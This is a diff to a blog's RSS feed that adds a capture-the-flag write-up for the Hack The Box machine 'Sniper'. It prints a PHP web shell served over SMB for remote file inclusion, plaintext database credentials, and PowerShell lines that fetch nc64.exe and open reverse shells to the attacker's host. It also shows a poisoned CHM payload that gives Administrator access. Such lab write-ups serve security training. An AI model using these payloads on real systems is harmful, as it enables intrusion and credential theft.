@@ -13,7 +13,276 @@
       <pubDate>Sun, 29 Mar 2020 16:21:41 +0000</pubDate>
       
       <guid>https://5ysk3y.github.io/htb/guides/sniper/</guid>
-      <description>Overview Sniper was one of my favorite boxes from recent memory. It leverages an RFI and Powershell constrained mode to eventually get a user shell. From there you poison a Windows Help (CHM) file in order to execute code as the Administrator user. Let&amp;rsquo;s take a look at how I did it. Please also note that the first part of this leverages a python script that I created; it&amp;rsquo;s referenced and included as a gist for your viewing.</description>
+      <description>Overview Sniper was one of my favorite boxes from recent memory. It leverages an RFI and Powershell constrained mode to eventually get a user shell. From there you poison a Windows Help (CHM) file in order to execute code as the Administrator user. Let&amp;rsquo;s take a look at how I did it.</description>
+      <content>
+  &lt;figure class=&#34;left&#34; &gt;
+    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/htb/sniper.png&#34;   /&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
+&lt;p&gt;Sniper was one of my favorite boxes from recent memory. It leverages an RFI and Powershell constrained mode to eventually get a user shell. From there you poison a Windows Help (CHM) file in order to execute code as the Administrator user. Let&amp;rsquo;s take a look at how I did it. Please also note that the first part of this leverages a python script that I created; it&amp;rsquo;s referenced and included as a gist for your viewing.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;nmap-scan&#34;&gt;NMAP Scan&lt;/h1&gt;
+&lt;p&gt;First up, from my standard nmap scan, we see :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nmap -A -oA nmap/snipper_initial -vvv 10.10.10.151
+
+Nmap scan report for 10.10.10.151
+Host is up, received echo-reply ttl 127 (0.017s latency).
+Scanned at 2019-10-08 17:54:45 BST for 60s
+Not shown: 996 filtered ports
+Reason: 996 no-responses
+PORT    STATE SERVICE       REASON          VERSION
+80/tcp  open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
+| http-methods:
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Sniper Co.
+135/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds? syn-ack ttl 127
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+TCP/IP fingerprint:
+SCAN(V=7.80%E=4%D=10/8%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=5D9CBF91%P=x86_64-pc-linux-gnu)
+SEQ(SP=103%GCD=1%ISR=10D%TI=I%II=I%SS=S%TS=U)
+OPS(O1=M54DNW8NNS%O2=M54DNW8NNS%O3=M54DNW8%O4=M54DNW8NNS%O5=M54DNW8NNS%O6=M54DNNS)
+WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
+ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M54DNW8NNS%CC=Y%Q=)
+T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
+T2(R=N)
+T3(R=N)
+T4(R=N)
+U1(R=N)
+IE(R=Y%DFI=N%TG=80%CD=Z)
+
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=259 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 7h00m47s
+| p2p-conficker:
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 25157/tcp): CLEAN (Timeout)
+|   Check 2 (port 18459/tcp): CLEAN (Timeout)
+|   Check 3 (port 51336/udp): CLEAN (Timeout)
+|   Check 4 (port 40243/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2019-10-08T23:55:52
+|_  start_date: N/A
+
+TRACEROUTE (using port 445/tcp)
+HOP RTT      ADDRESS
+1   16.83 ms 10.10.14.1
+2   16.86 ms 10.10.10.151
+
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Oct  8 17:55:45 2019 -- 1 IP address (1 host up) scanned in 59.98 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;user-pwn&#34;&gt;User Pwn&lt;/h1&gt;
+&lt;p&gt;For the most part there&amp;rsquo;s only the web port, so lets start by checking that out:&lt;/p&gt;
+&lt;p&gt;http://10.10.10.151/&lt;/p&gt;
+&lt;p&gt;Nothing special in the source. There&amp;rsquo;s 2 links that lead off here:&lt;/p&gt;
+&lt;p&gt;http://10.10.10.151/blog/
+http://10.10.10.151/user/&lt;/p&gt;
+&lt;p&gt;The blog itself doesnt appear to be built on any CMS framework; the only significant thing I can see thus far is that it has the ability to interchange languages via a PHP URL arugment, but we&amp;rsquo;ll revisit that shortly. I also took a copy of such a request and fed it to SQLMap for examination. It doesnt appear to have been able to find any injection points.&lt;/p&gt;
+&lt;p&gt;I&amp;rsquo;m also running full dirb scans of the /blog and /user URL&amp;rsquo;s and, in the case the user URL, I was able to sign up and login. Once logged in you get sent to a construction page, again no useful info in the source. The dirb scan for /user includes the login cookie associated with my registration to ensure it scans everything it can, but it doesn&amp;rsquo;t give further results.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; ~/HTB/Boxes/Sniper/dirb cat sniper_initial.dirb | grep 200 | sort | uniq -i
+/blog (Status: 200)
+/index.php (Status: 200)
+/user (Status: 200)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Based on intitial enumeration I found some CSS code that referenced something called “fostrap” which appears to be a theming template for Blogger. This appears to be a bit of dead end though.&lt;/p&gt;
+&lt;p&gt;On top of this, as briefly mentioned, there appears to be some form of LFI/RFI expoit here; on the blog, theres only 3 working links in the sites menu, all of these follow the context of:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/blog/?lang=blog-&amp;lt;lang&amp;gt;.php &lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Where &lt;code&gt;lang&lt;/code&gt; is (e.g.) en, fr, es. I&amp;rsquo;ve attempted to fuzz the parameter to some success; including the index.php page forces the page to include itself and that basically breaks the application for that particular load. I&amp;rsquo;ve also tried fuzzing for .aspx and asp, as theyre common IIS file types but nothing has come back from that.&lt;/p&gt;
+&lt;p&gt;After browsing around to see how this can be exploited, it turns out theres a particular vulnerability to allow exploiting of RFI in conjunction with PHP and SMB:&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html&#34; target=&#34;_blank&#34;&gt;RFI using PHP/SMB&lt;/a&gt;
+&lt;/p&gt;
+&lt;p&gt;This effectively uses a PHP exploit that involves including files from remote SMB shares regardless of whether standard PHP file include restictions (fopen_url etc) are enabled. In this case, they are. So we should be able to abuse this. I&amp;rsquo;ve setup an SMB share and inside it I&amp;rsquo;ve got a file called hax.php (yes, I know, Its leet). Quite simply, it contains this:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;lt;?php system($_GET[&#39;cmd&#39;]); ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;For posterity the following also reflects the codeblock used in my smb.conf file:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[share]
+path = /var/www/html/pub
+writable = no
+guest ok = yes
+guest only = yes
+read only = yes
+directory mode = 0555
+force user = nobody
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I&amp;rsquo;ve also created a Gist that contains these 2 things, as well as a Python based wrapper script that can be used to execute commands on the machine directly. All of those things can be found here:&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://gist.github.com/5ysk3y/aeb4562d0e3473db315e41ba45bf7e3e&#34; target=&#34;_blank&#34;&gt;Sniper Gist by 5ysk3y&lt;/a&gt;
+&lt;/p&gt;
+&lt;p&gt;To exploit this using this script we call our malicious file via the SMB share in the url as follows:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;http://10.10.10.151/blog/?lang=\\\10.10.14.34\share\hax.php&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This returns the HTML elements of the script, when we view the source; to use it, we append &lt;code&gt;&amp;amp;cmd=some+command+here&lt;/code&gt; to the url (make sure to change the request type to POST as well).&lt;/p&gt;
+&lt;p&gt;From there, we can run commands, e.g:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;http://10.10.10.151/blog/?lang=\\\10.10.14.34\share\hax.php&amp;amp;cmd=dir ..\user\&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;To view the contents of the /user directory (from our initial dirb scans). This shows us some cool stuff:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;10/01/2019  08:44 AM    &amp;lt;DIR&amp;gt;          .
+10/01/2019  08:44 AM    &amp;lt;DIR&amp;gt;          ..
+04/11/2019  05:15 PM               108 auth.php
+04/11/2019  05:52 AM    &amp;lt;DIR&amp;gt;          css
+04/11/2019  10:51 AM               337 db.php
+04/11/2019  05:23 AM    &amp;lt;DIR&amp;gt;          fonts
+04/11/2019  05:23 AM    &amp;lt;DIR&amp;gt;          images
+04/11/2019  06:18 AM             4,639 index.php
+04/11/2019  05:23 AM    &amp;lt;DIR&amp;gt;          js
+04/11/2019  06:10 AM             6,463 login.php
+04/08/2019  11:04 PM               148 logout.php
+10/01/2019  08:42 AM             7,192 registration.php
+08/14/2019  10:35 PM             7,004 registration_old123123123847.php
+04/11/2019  05:23 AM    &amp;lt;DIR&amp;gt;          vendor
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looking at the old registration file above, it shows us how the form actually inserts values from the registration form into the DB&amp;ndash; specifically it tells us the table that data gets inserted into. On top of that, the db.php file contains a full connection statement, including creds, that we can use to basically query the contents of the users table using our RFI method. After a bit of fiddling, effectively I created a new file in the SMB share (mysql.php) with the following code:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+$con = mysqli_connect(&amp;quot;localhost&amp;quot;,&amp;quot;dbuser&amp;quot;,&amp;quot;36mEAhz/B8xQ~2VM&amp;quot;,&amp;quot;sniper&amp;quot;);
+$query = &amp;quot;SELECT * from users&amp;quot;;
+$result = mysqli_query($con,$query);
+
+while($output = mysqli_fetch_array($result)) {
+		print_r($output);
+}
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hopefully this is fairly self explanatory; I lifted the $con variable from the server-side copy of db.php, adjusted the query to simply select everything from the users table, and then (the fiddly bit) was getting it to dump the contents. Which I now have :) The two users of interest (for reasons) are my own login info (via the test account I registered with):&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Array
+(
+	[0] =&amp;gt; 12
+	[id] =&amp;gt; 12
+	[1] =&amp;gt; 5ysk3y
+	[username] =&amp;gt; 5ysk3y
+	[2] =&amp;gt; a@b.c
+	[email] =&amp;gt; a@b.c
+	[3] =&amp;gt; 5f4dcc3b5aa765d61d8327deb882cf99
+	[password] =&amp;gt; 5f4dcc3b5aa765d61d8327deb882cf99
+	[4] =&amp;gt; 2019-10-14 01:54:13
+	[trn_date] =&amp;gt; 2019-10-14 01:54:13
+)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And the superuser password hash:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Array
+(
+	[0] =&amp;gt; 1
+	[id] =&amp;gt; 1
+	[1] =&amp;gt; superuser
+	[username] =&amp;gt; superuser
+	[2] =&amp;gt; admin@sniper.co
+	[email] =&amp;gt; admin@sniper.co
+	[3] =&amp;gt; 6e573c8b25e9168e0c61895d821a3d57
+	[password] =&amp;gt; 6e573c8b25e9168e0c61895d821a3d57
+	[4] =&amp;gt; 2019-04-11 22:45:36
+	[trn_date] =&amp;gt; 2019-04-11 22:45:36
+)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;There are more, likely from signups from other HTB users, so I&amp;rsquo;ve dumped them all for reference. I grabbed my own registered password hash to see if I can crack it (since I know what the pass is) before I move onto super user.&lt;/p&gt;
+&lt;p&gt;Also, I have used my wrapper script to enum the users on this box:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;04/09/2019  06:47 AM    &amp;lt;DIR&amp;gt;          Administrator
+04/11/2019  07:04 AM    &amp;lt;DIR&amp;gt;          Chris
+
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sadly I cant dir the contents but non the less! I&amp;rsquo;ve also just realised that the old registration form tells us exactly what type of format the DB passwords are stored in, as its inserted in the following manner:&lt;/p&gt;
+&lt;p&gt;.md5($password).&lt;/p&gt;
+&lt;p&gt;So its an MD5 hash. Lets try to crack our own! Hashcat got it:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
+5f4dcc3b5aa765d61d8327deb882cf99:password
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sadly the sysadmin password didnt seem to crack quite as easily - SSH isnt available on this server as it&amp;rsquo;s a Windows box, so its likely we will need to priv esc, meaning the sooner we can get a stable shell the better.&lt;/p&gt;
+&lt;p&gt;In order to get a stable shell, I had to supply my own netcat binary to Windows and then use that directly. Specifically:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Upload nc64 (windows netcat, using this specific command):&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;code&gt;python exploit.py &amp;quot;powershell.exe -nop -exec bypass -c Invoke-WebRequest -Uri http://10.10.14.23:9001/nc64.exe -OutFile C:\\Windows\\temp\\nc64.exe&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;This will serve nc64 and save it in Windows temp dir. We can then call it using the same powershell syntax, ensuring you have netcat listening:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;code&gt;python exploit.py &amp;quot;powershell.exe -nop -exec bypass -c C:\\Windows\\temp\\nc64.exe 10.10.14.23 9002 -e powershell&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;From there we can use our enumerated data to login as the user account; we know the username is Chris, and some trial and error logins to crackmapexec show we also have a valid password from the databsae file - not many passwords have been found up to now, but attempting to use Chris&#39; username with the MySQL password we found earlier does yield results. Let&amp;rsquo;s setup our credential object so we can privesc:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$user = &amp;quot;SNIPER\Chris&amp;quot;
+$pass = ConvertTo-SecureString &amp;quot;36mEAhz/B8xQ~2VM&amp;quot; -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential($user,$pass)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And then use it to execute code as Chris&#39; user, e.g:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;PS C:\inetpub\wwwroot\blog&amp;gt; Invoke-Command -ComputerName SNIPER -ScriptBlock { whoami } -Credential $creds
+sniper\chris
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;From there I downloaded another copy of nc64.exe that would be owned by Chris:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Invoke-Command -ComputerName SNIPER -ScriptBlock { Invoke-WebRequest -Uri http://10.10.14.23:9001/nc64.exe -OutFile C:\\Users\\Chris\\Documents\\nc64.exe } -Credential $creds
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And then ran that to get a second reverse shell:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Invoke-Command -ComputerName SNIPER -ScriptBlock { C:\Users\Chris\Documents\nc64.exe 10.10.14.23 9002 -e powershell.exe } -Credential $creds&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;And the subsquent user flag:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;PS C:\Docs&amp;gt; type C:\Users\Chris\Desktop\user.txt
+type C:\Users\Chris\Desktop\user.txt
+21f4d0f29fc4dd867500c1ad716cf56e
+&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
+&lt;h1 id=&#34;root-pwn&#34;&gt;Root Pwn&lt;/h1&gt;
+&lt;p&gt;Next onto root, some basic enum of the root dir (C:) shows an interesting and unusual “docs” folder..&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;PS C:\Docs&amp;gt; dir
+
+    Directory&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; C:\Docs
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        4/11/2019   9&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;31 AM            285 note.tx
+-a----        4/11/2019   9&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;17 AM         552607 php &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; dummies-trial.pdf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Lets have a look at that note:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;PS C:\Docs&amp;gt; type note.txt
+
+Hi Chris,
+Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you&#39;ve prepared the documentation for our new app. Drop it here when you&#39;re done with it.
+
+Regards,
+Sniper CEO.
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So this seems to be hinting at an exploit involving CHM (Compiled Help Files for Windows). I sought to narrow down what CHM files existed on the box:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$dir = Get-ChildItem C:\ -recurse -file -force -ErrorAction SilentlyContinue&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This pulls all visible files from the C:\ drive into a variable (thats a big list..) and we then narrow it down to just CHM files:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$List = $Dir | where {$_.extension -eq &amp;quot;.chm&amp;quot;}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Having glossed over all of them, the most obvious one is the first in the list:&lt;/p&gt;
+&lt;p&gt;$List | format-table name,directory | select -first 10&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Name                                                        Directory
+----                                                        ---------
+instructions.chm                                            C:\Users\Chris\Downloads
+cliconf.chm                                                 C:\Windows\Help\mui\0409
+mmc.CHM                                                     C:\Windows\Help\mui\0409
+msdasc.chm                                                  C:\Windows\Help\mui\0409
+msorcl32.chm                                                C:\Windows\Help\mui\0409
+odbcinst.chm                                                C:\Windows\Help\mui\0409
+odbcjet.chm                                                 C:\Windows\Help\mui\0409
+sqlsodbc.chm                                                C:\Windows\Help\mui\0409
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I&amp;rsquo;ve downloaded a copy of this (via SMB) in order to look into it further.&lt;/p&gt;
+&lt;p&gt;In a nutshell this is going to be a poisoned CHM exploit:&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7&#34; target=&#34;_blank&#34;&gt;Poison CHM Gist&lt;/a&gt;
+&lt;/p&gt;
+&lt;p&gt;Lets do this manually first. On a Windows machine I decompiled the CHM file we got from Chris using something called &lt;a href=&#34;http://keyworks.helpmvp.com/home/keytools&#34; target=&#34;_blank&#34;&gt;KeyTools&lt;/a&gt;
+ - this allows you to decompile CHM files so their contents can be modified. This isn&amp;rsquo;t necessary but I chose to do it as a learning exercise. Once extracted, I created a copy of the single html file in there, and added the exploit as described in the above link:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;OBJECT id=x classid=&amp;quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&amp;quot; width=1 height=1&amp;gt;
+  &amp;lt;PARAM name=&amp;quot;Command&amp;quot; value=&amp;quot;ShortCut&amp;quot;&amp;gt;
+  &amp;lt;PARAM name=&amp;quot;Button&amp;quot; value=&amp;quot;Bitmap::shortcut&amp;quot;&amp;gt;
+  &amp;lt;PARAM name=&amp;quot;Item1&amp;quot; value=&#39;,cmd.exe,/c C:\Users\Chris\Documents\nc64.exe 10.10.14.23 9003 -e powershell.exe&#39;&amp;gt;
+  &amp;lt;PARAM name=&amp;quot;Item2&amp;quot; value=&amp;quot;273,1,1&amp;quot;&amp;gt;
+&amp;lt;/OBJECT&amp;gt;
+&amp;lt;SCRIPT&amp;gt;
+  x.Click();
+&amp;lt;/SCRIPT&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;From there, we can download &lt;a href=&#34;https://www.microsoft.com/en-us/download/details.aspx?id=21138&#34; target=&#34;_blank&#34;&gt;HTML Help Workshop&lt;/a&gt;
+ and recompile the CHM file inclusive of our newly poisoned HTML doc. You can also compile a new project from scratch to do this, completely omitting KeyTools altogether.&lt;/p&gt;
+&lt;p&gt;For me, getting this to actually work was massively hit and miss. A good test before running this is to get the box to ping you via &lt;code&gt;ping -n 2 &amp;lt;IP.ADDRESS&amp;gt;&lt;/code&gt; - changing the value of the Item1 parameter in our XML code above will acheive this.&lt;/p&gt;
+&lt;p&gt;Once confirmed I compiled the CHM with the nc64.exe line and moved it into C:\Docs - with a listener running. After a few attempts we get a call back:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;skynet Boxes/Sniper » nc -nlvp 9003
+Connection from 10.10.10.151:49719
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32&amp;gt; whoami
+sniper\administrator
+
+PS C:\Windows\system32&amp;gt; hostname
+Sniper
+
+PS C:\Windows\system32&amp;gt; type C:\Users\Administrator\Desktop\root.txt
+5624caf363e2750e994f6be0b7436c15
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Result!&lt;/p&gt;
+</content>
     </item>
     
   </channel>
